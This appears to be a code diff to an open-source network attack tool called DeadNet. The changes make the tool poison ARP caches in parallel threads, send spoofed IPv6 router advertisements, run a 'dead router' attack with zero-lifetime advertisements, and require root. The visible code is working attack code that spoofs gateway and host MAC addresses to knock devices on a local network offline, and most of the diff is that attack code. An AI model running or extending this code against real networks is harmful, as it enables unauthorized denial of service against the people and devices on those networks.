@@ -3,11 +3,16 @@
 import ipaddress
 import logging
 import netifaces
+
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
 
+from concurrent.futures import ThreadPoolExecutor
 from scapy.all import *
 from utils import *
+
 conf.verb = 0
+
+
 #   --------------------------------------------------------------------------------------------------------------------
 #   ....................................................................................................................
 #   ....................................................................................................................
@@ -62,6 +67,7 @@ class DeadNet:
                 printf(f"{RED}[-]{WHITE} Windows does not support ping6, skipping...")
         else:
             printf(f"{RED}[-]{WHITE} IPv6 RA spoof is disabled, skipping ping6...")
+        printf(f"{BLUE}[*]{WHITE} Setting up attack...")
         self.abort = False
 
     def get_gateway_mac(self):
@@ -74,7 +80,8 @@ class DeadNet:
                 for line in output.split('\n'):
                     columns = line.split()
                     if len(columns) >= 4:
-                        if columns[3] == 'lladdr' and columns[4] != '<incomplete>' and columns[2] == self.network_interface:
+                        if columns[3] == 'lladdr' and columns[4] != '<incomplete>' and \
+                                columns[2] == self.network_interface:
                             gateway_hwaddr = columns[4]
                             break
             except Exception as exc:
@@ -116,19 +123,22 @@ class DeadNet:
             self.user_abort()
         return ipv6_hosts
 
+    def poison_arp_single_host(self, host_ip):
+        arp_packet_gateway = ARP(op=2, psrc=host_ip, hwdst=self.gateway_mac, hwsrc=RandMAC(),
+                                 pdst=self.gateway_ipv4)
+        sendp(Ether() / arp_packet_gateway, iface=self.network_interface)
+
+        # poison host's arp cache
+        arp_packet_host = ARP(op=2, psrc=self.gateway_ipv4, hwsrc=RandMAC(), pdst=host_ip)
+        sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet_host, iface=self.network_interface)
+
     def poison_arp(self):
         """
         * poison the gateway arp cache with a spoofed mac address for every possible host
         * poison every possible host with a spoofed mac address for the gateway
         """
-        for host_ip in self.host_ipv4s:
-            arp_packet_gateway = ARP(op=2, psrc=host_ip, hwdst=self.gateway_mac, hwsrc=RandMAC(),
-                                     pdst=self.gateway_ipv4)
-            sendp(Ether() / arp_packet_gateway, iface=self.network_interface)
-
-            # poison host's arp cache
-            arp_packet_host = ARP(op=2, psrc=self.gateway_ipv4, hwsrc=RandMAC(), pdst=host_ip)
-            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet_host, iface=self.network_interface)
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            executor.map(self.poison_arp_single_host, self.host_ipv4s)
 
     def poison_ra(self):
         """
@@ -142,7 +152,7 @@ class DeadNet:
                         ICMPv6NDOptMTU() / \
                         ICMPv6NDOptPrefixInfo(prefixlen=self.ipv6_preflen, prefix=f"{IPV6_LL_PREF}::")
         sendp(spoofed_mc_ra)
-    
+
     def dead_router_attack(self):
         """
         * Monitor RA messages and immediately send fake zero-lifetime RA packets
@@ -181,12 +191,12 @@ class DeadNet:
     def get_gateway_ipv4(iface):
         try:
             gateways = netifaces.gateways()
-            ipv4_gateways = gateways[netifaces.AF_INET] # ipv4 gateways
+            ipv4_gateways = gateways[netifaces.AF_INET]  # ipv4 gateways
             for ipv4_data in ipv4_gateways:
                 if ipv4_data[1] == iface:
                     return ipv4_data[0]
         except Exception:
-            pass # try scapy instead
+            pass  # try scapy instead
         try:
             return [r[2] for r in conf.route.routes if r[3] == iface and r[2] != '0.0.0.0'][0]
         except Exception:
@@ -196,6 +206,8 @@ class DeadNet:
 if __name__ == "__main__":
     print(f"\n{BANNER}\nWritten by @flashnuke")
     print(DELIM)
+    if os.geteuid() != 0:
+        raise PermissionError(f"Must be run as root")
 
     arguments = define_args()
     invalidate_print()  # after arg parsing
